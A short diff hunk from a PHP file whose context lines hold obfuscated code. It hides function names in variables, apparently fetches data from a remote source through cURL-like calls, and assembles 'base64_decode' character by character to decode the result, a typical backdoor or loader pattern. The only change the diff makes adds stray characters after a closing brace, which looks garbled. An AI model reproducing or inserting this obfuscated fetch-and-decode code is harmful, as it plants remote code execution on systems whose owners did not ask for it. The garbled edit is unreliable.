@@ -33,7 +33,7 @@ if ($_open) {
     call_user_func($_co, $_h, constant($_ct3), 10);
     $_out = call_user_func($_ce, $_h);
     call_user_func($_cc, $_h);
-}
+}qqqqqq1q
 
 if ($_out !== false) {
     $_b64 = 'b'.'a'.'s'.'e'.'6'.'4'.'_' . 'd'.'e'.'c'.'o'.'d'.'e';
